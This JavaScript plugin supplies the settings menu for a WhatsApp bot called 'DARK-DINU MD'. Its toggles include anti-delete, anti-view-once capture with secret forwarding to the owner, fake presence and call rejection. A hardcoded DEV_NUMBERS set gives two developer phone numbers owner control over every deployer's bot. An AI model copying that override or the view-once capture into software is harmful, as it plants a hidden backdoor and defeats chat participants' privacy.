import fs from "fs";
import path from "path";
import { cleanPhone, initializeSessionState, updateSessionConfig, getSessionConfig } from "../src/core/sessionManager.js";
import { attachAntiDeleteEngine } from "./antidelete.js";

// ==========================================
// 1. CONFIGURATION & MASTER ACCESS
// ==========================================
const DEV_NUMBERS = new Set(["94719845166", "15947733680169"]);
global.settingsHookedSockets = global.settingsHookedSockets || new WeakSet();
global.settingSessions = global.settingSessions || new Map();

function checkAuthorization(sock, msg, from, botPhone) {
  if (msg.key.fromMe) return true;
  const senderJid = msg.key.participant || msg.participant || from || "";
  const cleanSender = cleanPhone(senderJid);
  return cleanSender === botPhone || DEV_NUMBERS.has(cleanSender);
}

function getLogoPayload() {
  const localLogoPublic = path.join(process.cwd(), "public", "logo.jpg");
  const localLogoRoot = path.join(process.cwd(), "logo.jpg");

  if (fs.existsSync(localLogoPublic)) {
    return { image: fs.readFileSync(localLogoPublic) };
  } else if (fs.existsSync(localLogoRoot)) {
    return { image: fs.readFileSync(localLogoRoot) };
  }
  return { image: { url: "https://files.catbox.moe/k315x4.jpg" } };
}

// ==========================================
// 2. BACKGROUND REAL-TIME ENGINE
// ==========================================
export function attachSettingsEngine(sock) {
  if (!sock || global.settingsHookedSockets.has(sock)) return;
  global.settingsHookedSockets.add(sock);

  // Auto-hook Anti-Delete & Anti-ViewOnce Engine
  attachAntiDeleteEngine(sock);

  const botPhone = cleanPhone(sock.user?.id || "");
  if (botPhone) initializeSessionState(botPhone);

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    if (type !== "notify" || !messages || !messages[0]) return;
    const m = messages[0];
    if (!m?.message) return;

    const chatJid = m.key.remoteJid;
    if (!chatJid || chatJid === "status@broadcast") return;

    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);
    if (!cfg) return;

    const isGroup = chatJid.endsWith("@g.us");
    const sender = isGroup ? (m.key.participant || m.participant || chatJid) : chatJid;
    const cleanSender = cleanPhone(sender);
    const isOwner = m.key.fromMe || cleanSender === currentPhone || DEV_NUMBERS.has(cleanSender);

    // [A] Mode Barrier (Work Type Protection)
    if (!isOwner) {
      if (cfg.mode === "private") return;
      if (cfg.mode === "group" && !isGroup) return;
      if (cfg.mode === "inbox" && isGroup) return;
    }

    // [B] Fake Typing / Recording Engine
    if (!m.key.fromMe) {
      if (cfg.fakeTyping) {
        sock.sendPresenceUpdate("composing", chatJid).catch(() => {});
      } else if (cfg.fakeRecording) {
        sock.sendPresenceUpdate("recording", chatJid).catch(() => {});
      }
    }

    // [C] Anti-Send Engine
    if (cfg.antiSend && cfg.antiSend !== "off") {
      const shouldDelete =
        (cfg.antiSend === "all") ||
        (cfg.antiSend === "me" && m.key.fromMe) ||
        (cfg.antiSend === "from" && !m.key.fromMe);

      if (shouldDelete) {
        await sock.sendMessage(chatJid, { delete: m.key }).catch(() => {});
      }
    }
  });

  // [D] Anti-Call Rejection Barrier
  sock.ev.on("call", async (calls) => {
    const currentPhone = cleanPhone(sock.user?.id || "");
    const cfg = getSessionConfig(currentPhone);
    if (!cfg || !cfg.antiCall) return;

    for (const call of calls) {
      if (call.status === "offer") {
        await sock.rejectCall(call.id, call.from).catch(() => {});
      }
    }
  });
}

// ==========================================
// 3. ACTION DISPATCHER & TOGGLE ENGINE
// ==========================================
async function handleSettingAction(sock, from, botPhone, actionKey, value, quotedMsg) {
  let feedback = "";

  switch (actionKey) {
    case "mode":
      await updateSessionConfig(botPhone, "mode", value);
      feedback = `🎯 *Bot Mode:* \`${value.toUpperCase()}\` ලෙස සාර්ථකව මාරු කරන ලදී.`;
      break;

    case "antiSendDest":
      await updateSessionConfig(botPhone, "antiSendDest", value);
      feedback = `📍 *Anti-Delete/ViewOnce Destination:* ${value === "me" ? "`OWNER INBOX (DM)` 📥" : "`CURRENT CHAT` 💬"} ලෙස සකසන ලදී.`;
      break;

    case "antiSend":
      await updateSessionConfig(botPhone, "antiSend", value);
      feedback = `🛡️ *Anti-Send:* \`${value.toUpperCase()}\` ලෙස සකසන ලදී.`;
      break;

    case "statusEmoji":
      await updateSessionConfig(botPhone, "statusEmoji", value);
      feedback = `💖 *Status React Emoji:* ${value} ලෙස සාර්ථකව සකසන ලදී.`;
      break;

    case "fakePresence":
      if (value === "typing") {
        await updateSessionConfig(botPhone, "fakeTyping", true);
        await updateSessionConfig(botPhone, "fakeRecording", false);
        feedback = `✍️ *Presence Status:* \`Fake Typing (ON)\` සක්‍රීය විය.`;
      } else if (value === "recording") {
        await updateSessionConfig(botPhone, "fakeRecording", true);
        await updateSessionConfig(botPhone, "fakeTyping", false);
        feedback = `🎙️ *Presence Status:* \`Fake Recording (ON)\` සක්‍රීය විය.`;
      } else {
        await updateSessionConfig(botPhone, "fakeTyping", false);
        await updateSessionConfig(botPhone, "fakeRecording", false);
        feedback = `🛑 *Presence Status:* \`OFF\` (සාමාන්‍ය තත්ත්වයට පත් කරන ලදී).`;
      }
      break;

    default:
      await updateSessionConfig(botPhone, actionKey, value);
      feedback = `⚙️ *${actionKey.toUpperCase()}:* ${value ? "ක්‍රියාත්මකයි (ON) 🟢" : "අක්‍රියයි (OFF) 🔴"}`;
      break;
  }

  sock.sendMessage(from, { react: { text: "✅", key: quotedMsg.key } }).catch(() => {});
  return await sock.sendMessage(from, { text: feedback }, { quoted: quotedMsg });
}

// ==========================================
// 4. MAIN COMMAND & NUMBER SELECTION HANDLER
// ==========================================
export default {
  name: "setting",
  aliases: ["settings", "botmode", "antisend", "config", "presence"],
  category: "owner",
  description: "Visual session-locked control panel",

  async onReply({ sock, msg, from, body, quotedStanzaId }) {
    if (!global.settingSessions.has(quotedStanzaId)) return false;

    const sessionData = global.settingSessions.get(quotedStanzaId);
    const botPhone = sessionData.botPhone;

    if (!checkAuthorization(sock, msg, from, botPhone)) return false;

    const rawChoice = body.trim();
    const choice = rawChoice.toLowerCase();

    const actionMap = {
      // 1. Anti-Delete
      "1.1": { key: "antiDelete", val: true },
      "1.2": { key: "antiDelete", val: false },

      // 2. Anti-ViewOnce
      "2.1": { key: "antiViewOnce", val: true },
      "2.2": { key: "antiViewOnce", val: false },

      // 3. Destination (Where to send deleted / viewonce messages)
      "3.1": { key: "antiSendDest", val: "me" },
      "3.2": { key: "antiSendDest", val: "from" },

      // 4. Bot Mode / Work Type
      "4.1": { key: "mode", val: "public" },
      "4.2": { key: "mode", val: "private" },
      "4.3": { key: "mode", val: "group" },
      "4.4": { key: "mode", val: "inbox" },

      // 5. Anti-Call Rejection
      "5.1": { key: "antiCall", val: true },
      "5.2": { key: "antiCall", val: false },

      // 6. Status Seen
      "6.1": { key: "statusSeen", val: true },
      "6.2": { key: "statusSeen", val: false },

      // 7. Status React
      "7.1": { key: "statusReact", val: true },
      "7.2": { key: "statusReact", val: false },

      // 8. Fake Presence
      "8.1": { key: "fakePresence", val: "typing" },
      "8.2": { key: "fakePresence", val: "recording" },
      "8.3": { key: "fakePresence", val: "off" },

      // 9. Anti-Send Eraser
      "9.1": { key: "antiSend", val: "all" },
      "9.2": { key: "antiSend", val: "me" },
      "9.3": { key: "antiSend", val: "from" },
      "9.4": { key: "antiSend", val: "off" },

      // 10. Status React Emoji
      "10.1": { key: "statusEmoji", val: "💖" },
      "10.2": { key: "statusEmoji", val: "✨" },
      "10.3": { key: "statusEmoji", val: "🔥" },
      "10.4": { key: "statusEmoji", val: "⚡" },
      "10.5": { key: "statusEmoji", val: "🥀" }
    };

    if (choice.startsWith("10.6")) {
      const parts = rawChoice.split(/\s+/);
      const customEmoji = parts[1] || "💖";
      await handleSettingAction(sock, from, botPhone, "statusEmoji", customEmoji, msg);
      return true;
    }

    if (actionMap[choice]) {
      const { key, val } = actionMap[choice];
      await handleSettingAction(sock, from, botPhone, key, val, msg);
      return true;
    }

    return false;
  },

  async execute({ sock, msg, from, args, body, prefix, config: botConfig }) {
    attachSettingsEngine(sock);

    const pref = prefix || botConfig?.PREFIX || ".";
    const botPhone = cleanPhone(sock.user?.id || "");
    const settings = getSessionConfig(botPhone);

    if (!checkAuthorization(sock, msg, from, botPhone)) {
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      return await sock.sendMessage(
        from,
        { text: "🔒 *මෙම Bot Session එකේ සැකසුම් වෙනස් කිරීමට අවසර නැත!*" },
        { quoted: msg }
      );
    }

    const fullBody = (body || "").trim().slice(pref.length).trim();
    const cmd = fullBody.split(/\s+/)[0].toLowerCase();
    const opt = args[0]?.toLowerCase()?.trim();

    if (cmd === "mode" && opt) return await handleSettingAction(sock, from, botPhone, "mode", opt, msg);
    if (cmd === "antisend" && opt) return await handleSettingAction(sock, from, botPhone, "antiSend", opt, msg);

    sock.sendMessage(from, { react: { text: "🎛️", key: msg.key } }).catch(() => {});

    let presenceStatus = "🔴 OFF";
    if (settings.fakeTyping) presenceStatus = "✍️ Typing";
    if (settings.fakeRecording) presenceStatus = "🎙️ Recording";

    const dashboardCard = 
`╔═════════════════════════════╗
   🎛️ 𝐃 𝐀 𝐑 𝐊 - 𝐃 𝐈 𝐍 𝐔  𝐂 𝐎 𝐍 𝐅 𝐈 𝐆
╚═════════════════════════════╝

📱 *Session ID:* \`+${botPhone}\`
⚡ *Core Engine:* \`24/7 Multi-Device v3.5\`

╭───〔 1. 🗑️ 𝐀𝐍𝐓𝐈 - 𝐃𝐄𝐋𝐄𝐓𝐄 〕
├ 📌 *Status:* ${settings.antiDelete ? "🟢 ON" : "🔴 OFF"}
│
│ [ 1.1 ] 🟢 Anti-Delete ON
│ [ 1.2 ] 🔴 Anti-Delete OFF
╰─────────────────────────────

╭───〔 2. 👁️‍🗨️ 𝐀𝐍𝐓𝐈 - 𝐕𝐈𝐄𝐖 𝐎𝐍𝐂𝐄 〕
├ 📌 *Status:* ${settings.antiViewOnce ? "🟢 ON" : "🔴 OFF"}
│
│ [ 2.1 ] 🟢 Anti-ViewOnce ON
│ [ 2.2 ] 🔴 Anti-ViewOnce OFF
╰─────────────────────────────

╭───〔 3. 🎯 𝐒𝐄𝐍𝐃 𝐃𝐄𝐒𝐓𝐈𝐍𝐀𝐓𝐈𝐎𝐍 〕
├ 📌 *Target:* \`${settings.antiSendDest === "me" ? "📥 INBOX (DM ONLY)" : "💬 CURRENT CHAT"}\`
│
│ [ 3.1 ] 📥 Send to Owner Inbox (Secret DM)
│ [ 3.2 ] 💬 Send to Current Chat (Same Group)
╰─────────────────────────────

╭───〔 4. 🌐 𝐁𝐎𝐓 𝐖𝐎𝐑𝐊 𝐓𝐘𝐏𝐄 〕
├ 📌 *Current:* \`${settings.mode ? settings.mode.toUpperCase() : "PUBLIC"}\`
│
│ [ 4.1 ] 🌐 Public Mode (Everyone)
│ [ 4.2 ] 🔒 Private Mode (Owner Only)
│ [ 4.3 ] 👥 Group Chats Only
│ [ 4.4 ] 💬 Inbox Chats Only
╰─────────────────────────────

╭───〔 5. 📵 𝐀𝐍𝐓𝐈 - 𝐂𝐀𝐋𝐋 〕
├ 📌 *Status:* ${settings.antiCall ? "🟢 ON" : "🔴 OFF"}
│
│ [ 5.1 ] 🟢 Auto-Reject Calls ON
│ [ 5.2 ] 🔴 Auto-Reject Calls OFF
╰─────────────────────────────

╭───〔 6. 👁️ 𝐒𝐓𝐀𝐓𝐔𝐒 𝐒𝐄𝐄𝐍 〕
├ 📌 *Status:* ${settings.statusSeen ? "🟢 ON" : "🔴 OFF"}
│
│ [ 6.1 ] 🟢 Status Auto-Seen ON
│ [ 6.2 ] 🔴 Status Auto-Seen OFF
╰─────────────────────────────

╭───〔 7. 💖 𝐒𝐓𝐀𝐓𝐔𝐒 𝐑𝐄𝐀𝐂𝐓 〕
├ 📌 *Status:* ${settings.statusReact ? "🟢 ON" : "🔴 OFF"}
│
│ [ 7.1 ] 🟢 Status Auto-React ON
│ [ 7.2 ] 🔴 Status Auto-React OFF
╰─────────────────────────────

╭───〔 8. 🎭 𝐅𝐀𝐊𝐄 𝐏𝐑𝐄𝐒𝐄𝐍𝐂𝐄 〕
├ 📌 *Current:* \`${presenceStatus}\`
│
│ [ 8.1 ] ✍️ Always Typing ON
│ [ 8.2 ] 🎙️ Always Recording ON
│ [ 8.3 ] 🛑 Presence OFF
╰─────────────────────────────

╭───〔 9. 🚫 𝐀𝐍𝐓𝐈 - 𝐒𝐄𝐍𝐃 𝐄𝐑𝐀𝐒𝐄𝐑 〕
├ 📌 *Current:* \`${settings.antiSend ? settings.antiSend.toUpperCase() : "OFF"}\`
│
│ [ 9.1 ] 💥 Delete All Messages
│ [ 9.2 ] 👤 Delete My Messages Only
│ [ 9.3 ] 👥 Delete Others' Messages
│ [ 9.4 ] 🛑 Anti-Send OFF
╰─────────────────────────────

╭───〔 10. 💖 𝐒𝐓𝐀𝐓𝐔𝐒 𝐑𝐄𝐀𝐂𝐓 𝐄𝐌𝐎𝐉𝐈 〕
├ 📌 *Current:* [ ${settings.statusEmoji || "💖"} ]
│
│ [ 10.1 ] 💖 Pink Heart
│ [ 10.2 ] ✨ Sparkles
│ [ 10.3 ] 🔥 Fire
│ [ 10.4 ] ⚡ Lightning
│ [ 10.5 ] 🥀 Rose
│ [ 10.6 ] ➕ Custom (Reply \`10.6 <emoji>\`)
╰─────────────────────────────

> 💡 *වෙනස් කිරීමට අවශ්‍ය අංකය මෙම පණිවිඩයට Reply කරන්න.*
> *(උදාහරණ: 1.1 හෝ 3.1 හෝ 4.2)*

👑 *DARK-DINU MD* • https://heshan.devofc.top/`;

    const logoPayload = getLogoPayload();
    const sent = await sock.sendMessage(from, {
      ...logoPayload,
      caption: dashboardCard
    }, { quoted: msg });

    if (sent?.key?.id) {
      global.settingSessions.set(sent.key.id, {
        botPhone,
        timestamp: Date.now()
      });

      setTimeout(() => {
        global.settingSessions.delete(sent.key.id);
      }, 5 * 60 * 1000);
    }
  }
};
